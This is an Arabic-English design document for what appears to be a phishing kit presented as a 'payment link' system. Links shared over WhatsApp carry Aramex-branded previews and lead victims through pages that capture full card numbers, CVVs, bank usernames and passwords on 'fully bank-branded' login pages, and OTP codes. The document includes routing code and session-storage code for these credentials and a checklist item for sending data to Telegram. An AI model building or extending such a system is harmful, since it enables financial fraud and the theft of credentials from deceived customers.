# 📊 مخطط تدفق نظام الدفع - Payment Flow Diagram

**الإصدار**: 3.1  
**التاريخ**: 7 ديسمبر 2025

---

## 🎯 التدفق الكامل - Full Flow

```
┌────────────────────────────────────────────────────────────────┐
│                    مرحلة الإنشاء (Admin)                       │
└────────────────────────────────────────────────────────────────┘

                    CreatePaymentLink
                   CreateShippingLink
                           │
                           ▼
              ┌────────────────────────┐
              │   إدخال بيانات الدفع   │
              │  • المبلغ              │
              │  • العملة (تلقائي)     │
              └────────────────────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │  اختيار طريقة الدفع ⭐ │
              └────────────────────────┘
                           │
              ┌────────────┴────────────┐
              │                         │
              ▼                         ▼
    ┌─────────────────┐      ┌─────────────────┐
    │ 💳 دفع بالبطاقة │      │ 🏦 تسجيل دخول  │
    └─────────────────┘      └─────────────────┘
              │                         │
              │                         ▼
              │              ┌─────────────────┐
              │              │ اختيار البنك؟   │
              │              │ (اختياري)       │
              │              └─────────────────┘
              │                         │
              └─────────────┬───────────┘
                            ▼
              ┌────────────────────────┐
              │  [زر] إنشاء الرابط     │
              └────────────────────────┘
                            │
                            ▼
┌──────────────────────────────────────────────────────────────┐
│              ✅ Success Dialog                               │
├──────────────────────────────────────────────────────────────┤
│  📊 ملخص الدفع                                              │
│  🔗 الرابط المُنشأ                                          │
│  ┌──────────────┐  ┌──────────────┐                         │
│  │ 📋 نسخ الرابط│  │ 👁️ معاينة   │                         │
│  └──────────────┘  └──────────────┘                         │
└──────────────────────────────────────────────────────────────┘
                            │
                            ▼
              📱 إرسال الرابط للعميل
              (WhatsApp, SMS, Email)
                            │
                            ▼
┌────────────────────────────────────────────────────────────────┐
│              🖼️ معاينة المشاركة على WhatsApp                  │
├────────────────────────────────────────────────────────────────┤
│  [صورة الخدمة - 1200x630]                                     │
│  📌 أرامكس - تتبع وتأكيد الدفع                               │
│  📝 خدمة أرامكس للشحن السريع                                │
│  💰 المبلغ: 500.00 ر.س                                       │
└────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────┐
│                  مرحلة الدفع (Customer)                        │
└────────────────────────────────────────────────────────────────┘

                   العميل يفتح الرابط
                           │
                           ▼
              ┌────────────────────────┐
              │   Microsite Page       │
              │  • صورة الخدمة         │
              │  • وصف تفصيلي          │
              │  • معلومات الدفع       │
              └────────────────────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │  PaymentRecipient      │
              │  بيانات المستلم        │
              │  • الاسم              │
              │  • البريد             │
              │  • الهاتف             │
              │  • العنوان            │
              └────────────────────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │  PaymentDetails        │
              │  تفاصيل الدفع          │
              │  • مراجعة المعلومات   │
              │  • تأكيد المبلغ        │
              └────────────────────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │  PaymentBankSelector   │
              │  اختيار البنك          │
              │  (اختياري)             │
              └────────────────────────┘
                           │
              ┌────────────┴────────────┐
              │     يفحص payment_method  │
              ▼                          ▼

┌──────────────────────┐   ┌──────────────────────┐
│  payment_method =    │   │  payment_method =    │
│  "card"              │   │  "bank_login"        │
└──────────────────────┘   └──────────────────────┘
            │                          │
            ▼                          │
┌──────────────────────┐               │
│  PaymentCardInput    │               │
│  بيانات البطاقة ✅   │               │
│  • رقم البطاقة      │               │
│  • الاسم            │               │
│  • تاريخ الانتهاء   │               │
│  • CVV              │               │
└──────────────────────┘               │
            │                          │
            │ ┌──────────────────────┐ │
            │ │  [SKIP Bank Login]   │ │
            │ │  ❌ لا يظهر          │ │
            │ └──────────────────────┘ │
            │                          │
            │                          ▼
            │              ┌──────────────────────┐
            │              │  PaymentBankLogin    │
            │              │  تسجيل الدخول ✅     │
            │              │  • اسم المستخدم     │
            │              │  • كلمة المرور       │
            │              │  (fully branded)     │
            │              └──────────────────────┘
            │                          │
            └──────────────┬───────────┘
                           ▼
              ┌────────────────────────┐
              │  PaymentOTP            │
              │  رمز التحقق ⭐         │
              │  (fully bank-branded)  │
              │  • إدخال OTP           │
              │  • محاولات متعددة      │
              └────────────────────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │  PaymentReceipt        │
              │  الإيصال النهائي       │
              │  ✅ تم الدفع بنجاح     │
              └────────────────────────┘
```

---

## 🔀 شجرة القرار - Decision Tree

```
                        إنشاء رابط دفع
                              │
                              ▼
                    اختيار طريقة الدفع
                              │
              ┌───────────────┴───────────────┐
              │                               │
         💳 بطاقة                        🏦 بنك
              │                               │
              ▼                               ▼
    payload.payment_method         payload.payment_method
           = "card"                      = "bank_login"
              │                               │
              ▼                               ▼
     حفظ في Supabase                   حفظ في Supabase
              │                               │
              ▼                               ▼
      العميل يفتح الرابط               العميل يفتح الرابط
              │                               │
              ▼                               ▼
        [مراحل مشتركة]                  [مراحل مشتركة]
      Microsite → Recipient           Microsite → Recipient
      → Details → Bank Selector       → Details → Bank Selector
              │                               │
              ▼                               ▼
      Bank Selector يفحص              Bank Selector يفحص
      payment_method = "card"         payment_method = "bank_login"
              │                               │
              ▼                               ▼
      navigate('/card-input') ✅      navigate('/bank-login') ✅
              │                               │
              ▼                               │
      PaymentCardInput                        │
      [إدخال بيانات البطاقة]                  │
              │                               │
              ▼                               │
      navigate('/otp') مباشرة                │
              │                               │
      [تخطي Bank Login] ❌                    │
              │                               │
              │                               ▼
              │                       PaymentBankLogin
              │                       [تسجيل الدخول]
              │                               │
              │                               ▼
              │                       navigate('/otp')
              │                               │
              │                       [تخطي Card Input] ❌
              │                               │
              └───────────────┬───────────────┘
                              ▼
                        PaymentOTP
                    [رمز التحقق - موحد]
                              │
                              ▼
                      PaymentReceipt
                     [الإيصال النهائي]
```

---

## 📱 تجربة المستخدم - User Experience

### السيناريو 1: دفع بالبطاقة

```
👤 المستخدم (Admin):
  1. يفتح CreatePaymentLink
  2. يدخل المبلغ: 500 ر.س
  3. يختار: "بطاقة ائتمان - دفع بالبطاقة" ✅
  4. يضغط "إنشاء رابط السداد"
  5. يرى Success Dialog:
     ┌───────────────────────────┐
     │ ✅ تم إنشاء رابط السداد! │
     │ المبلغ: 500 ر.س          │
     │ الطريقة: بطاقة ائتمان    │
     │ [📋 نسخ] [👁️ معاينة]    │
     └───────────────────────────┘
  6. ينسخ الرابط
  7. يرسله على WhatsApp

👨‍💼 العميل:
  1. يستلم الرابط على WhatsApp
  2. يرى:
     ┌───────────────────────┐
     │ 🖼️ [صورة الخدمة]     │
     │ سداد فاتورة          │
     │ نظام دفع آمن         │
     │ 500 ر.س             │
     └───────────────────────┘
  3. يفتح الرابط
  4. Microsite → يرى تفاصيل جميلة
  5. Recipient → يدخل بياناته
  6. Details → يراجع
  7. Bank Selector → يختار بنك (أو يتخطى)
  8. Card Input → يدخل بيانات البطاقة ✅
  9. [يتخطى Bank Login] ❌
  10. OTP → يدخل الرمز ✅
  11. Receipt → يرى الإيصال ✅
```

### السيناريو 2: تسجيل الدخول البنكي

```
👤 المستخدم (Admin):
  1. يفتح CreatePaymentLink
  2. يدخل المبلغ: 500 ر.س
  3. يختار: "تسجيل دخول البنك" ✅
  4. (اختياري) يختار البنك
  5. يضغط "إنشاء رابط السداد"
  6. يرى Success Dialog مع أزرار النسخ والمعاينة
  7. ينسخ ويرسل الرابط

👨‍💼 العميل:
  1. يستلم الرابط (مع صورة ووصف)
  2. يفتح الرابط
  3. Microsite → تفاصيل الخدمة
  4. Recipient → بياناته
  5. Details → مراجعة
  6. Bank Selector → اختيار البنك
  7. [يتخطى Card Input] ❌
  8. Bank Login → تسجيل الدخول ✅
  9. OTP → إدخال الرمز ✅
  10. Receipt → الإيصال ✅
```

---

## 🔄 مقارنة التدفقين

```
┌─────────────────────┬──────────────────┬──────────────────┐
│      المرحلة       │  دفع بالبطاقة   │  تسجيل الدخول   │
├─────────────────────┼──────────────────┼──────────────────┤
│ 1. Microsite        │       ✅         │       ✅         │
├─────────────────────┼──────────────────┼──────────────────┤
│ 2. Recipient        │       ✅         │       ✅         │
├─────────────────────┼──────────────────┼──────────────────┤
│ 3. Details          │       ✅         │       ✅         │
├─────────────────────┼──────────────────┼──────────────────┤
│ 4. Bank Selector    │       ✅         │       ✅         │
├─────────────────────┼──────────────────┼──────────────────┤
│ 5. Card Input       │    ✅ يظهر      │    ❌ يتخطى     │
├─────────────────────┼──────────────────┼──────────────────┤
│ 6. Bank Login       │    ❌ يتخطى     │    ✅ يظهر      │
├─────────────────────┼──────────────────┼──────────────────┤
│ 7. OTP              │       ✅         │       ✅         │
├─────────────────────┼──────────────────┼──────────────────┤
│ 8. Receipt          │       ✅         │       ✅         │
├─────────────────────┼──────────────────┼──────────────────┤
│ عدد الصفحات الكلي   │        7         │        7         │
├─────────────────────┼──────────────────┼──────────────────┤
│ الوقت المقدر        │    3-4 دقائق    │    4-5 دقائق    │
└─────────────────────┴──────────────────┴──────────────────┘
```

---

## 🎨 واجهات المستخدم

### 1. CreatePaymentLink - صفحة الإنشاء

```
┌──────────────────────────────────────────────┐
│        🇸🇦 إنشاء رابط سداد - السعودية       │
└──────────────────────────────────────────────┘

┌──────────────────────────────────────────────┐
│  💵 مبلغ السداد *                            │
│  ┌────────────────────────────────────────┐  │
│  │ 500.00                                 │  │
│  └────────────────────────────────────────┘  │
│  💱 العملة: ريال سعودي (ر.س)              │
└──────────────────────────────────────────────┘

┌──────────────────────────────────────────────┐
│  💳 طريقة الدفع *                            │
│  ┌────────────────────────────────────────┐  │
│  │ ◉ بطاقة ائتمان - دفع بالبطاقة        │  │
│  │ ○ تسجيل دخول البنك                    │  │
│  └────────────────────────────────────────┘  │
│  🔒 سيُطلب من العميل إدخال بيانات البطاقة │
└──────────────────────────────────────────────┘

┌──────────────────────────────────────────────┐
│         [إنشاء رابط السداد]                  │
└──────────────────────────────────────────────┘
```

### 2. Success Dialog - بعد الإنشاء

```
┌────────────────────────────────────────────────┐
│      ✅ تم إنشاء رابط السداد بنجاح!          │
│                                                │
│  يمكنك نسخ الرابط ومشاركته مع العميل        │
├────────────────────────────────────────────────┤
│  📊 ملخص الدفع:                               │
│  ┌──────────────────────────────────────────┐ │
│  │ المبلغ:        500.00 ر.س               │ │
│  │ العملة:        ريال سعودي               │ │
│  │ طريقة الدفع:   بطاقة ائتمان             │ │
│  └──────────────────────────────────────────┘ │
├────────────────────────────────────────────────┤
│  🔗 الرابط:                                   │
│  ┌──────────────────────────────────────────┐ │
│  │ https://gulf-unified-payment.netlify..  │ │
│  │ .app/r/SA/payment/abc123                │ │
│  └──────────────────────────────────────────┘ │
├────────────────────────────────────────────────┤
│  ┌──────────────────┐  ┌─────────────────┐   │
│  │  📋 نسخ الرابط   │  │  👁️ معاينة     │   │
│  └──────────────────┘  └─────────────────┘   │
└────────────────────────────────────────────────┘
```

### 3. WhatsApp Preview - معاينة المشاركة

```
┌────────────────────────────────────────┐
│                                        │
│  ╔══════════════════════════════════╗ │
│  ║  [صورة أرامكس - شاحنة توصيل]    ║ │
│  ║                                  ║ │
│  ║  1200 x 630 px                   ║ │
│  ╚══════════════════════════════════╝ │
│                                        │
│  📌 أرامكس - تتبع وتأكيد الدفع      │
│                                        │
│  📝 خدمة أرامكس للشحن السريع -      │
│     نظام دفع آمن ومحمي               │
│                                        │
│  📦 شحنة رقم: 123456789              │
│  💰 المبلغ: 500.00 ر.س              │
│                                        │
│  🔗 gulf-unified-payment.netlify.app │
│                                        │
│  [اضغط للفتح]                        │
└────────────────────────────────────────┘
```

---

## 📋 Payload Structure

### في CreatePaymentLink (حفظ في Supabase):

```json
{
  "payment_amount": 500,
  "currency_code": "SAR",
  "payment_method": "card",           // ⭐ جديد
  "selected_bank": "alrajhi",         // ⭐ اختياري
  "selectedCountry": "SA",
  "service_key": "payment",
  "service_name": "سداد فاتورة"
}
```

### في PaymentBankSelector (قراءة):

```typescript
const paymentMethod = linkData.payload?.payment_method || 'card';

// منطق التوجيه
if (paymentMethod === 'bank_login') {
  navigate('/bank-login');     // ✅ للتسجيل
} else {
  navigate('/card-input');     // ✅ للبطاقة
}
```

---

## 🔐 البيانات المحفوظة

### في Session Storage (بطاقة):
```javascript
sessionStorage.setItem('cardLast4', '4321');
sessionStorage.setItem('cardName', 'Ahmed Ali');
sessionStorage.setItem('cardNumber', '4111111111111111');
sessionStorage.setItem('cardExpiry', '12/25');
sessionStorage.setItem('cardCvv', '123');
sessionStorage.setItem('cardType', 'visa');
```

### في Session Storage (بنك):
```javascript
sessionStorage.setItem('bankUsername', 'ahmed123');
sessionStorage.setItem('bankId', 'alrajhi');
sessionStorage.setItem('loginType', 'username');
```

---

## 🎯 Routes Map

```
/create/SA/payment
  └─> CreatePaymentLink
       └─> [إنشاء] → Success Dialog
                        └─> [نسخ] [معاينة]

/r/SA/payment/{id}
  └─> Microsite (مع Open Graph)

/pay/{id}/recipient
  └─> PaymentRecipient

/pay/{id}/payment-method
  └─> PaymentMethodSelection (تُستخدم إذا لم تُحفظ مسبقاً)

/pay/{id}/payment-details
  └─> PaymentDetails

/pay/{id}/bank-selector
  └─> PaymentBankSelector
       ├─> [card] → /card-input
       └─> [bank_login] → /bank-login

/pay/{id}/card-input
  └─> PaymentCardInput → /otp (تخطي bank-login)

/pay/{id}/bank-login
  └─> PaymentBankLogin → /otp (تخطي card-input)

/pay/{id}/otp
  └─> PaymentOTP

/pay/{id}/receipt
  └─> PaymentReceipt
```

---

## ✅ قائمة التحقق - Checklist

### ميزات الإنشاء:
- [x] اختيار طريقة الدفع
- [x] اختيار البنك (لـ bank_login)
- [x] حفظ الاختيار في payload
- [x] Success Dialog بعد الإنشاء
- [x] زر نسخ الرابط
- [x] زر معاينة الرابط
- [x] ملخص معلومات الدفع
- [x] إرسال إلى Telegram

### ميزات المشاركة:
- [x] Open Graph meta tags
- [x] Twitter Card
- [x] صورة مناسبة (1200x630)
- [x] عنوان واضح
- [x] وصف تفصيلي
- [x] عرض المبلغ والعملة

### ميزات التدفق:
- [x] تخطي Card Input للـ bank_login
- [x] تخطي Bank Login للـ card
- [x] منطق شرطي في Bank Selector
- [x] Cross-device compatibility
- [x] Session storage للبيانات

---

## 🚀 النتيجة

### التحسينات:
✅ **اختيار مرن** - طريقتان للدفع  
✅ **نسخ سهل** - بزر واحد  
✅ **معاينة فورية** - قبل الإرسال  
✅ **مشاركة احترافية** - صورة ووصف  
✅ **تدفق ذكي** - تخطي الصفحات غير الضرورية  
✅ **تجربة سلسة** - من الإنشاء للدفع  

**🎉 نظام إنشاء روابط احترافي ومتكامل!**

---

**ابدأ الآن:**
```bash
npm run dev
```
**افتح:** `/create/SA/payment`

**🔗 أنشئ رابطك الأول!**
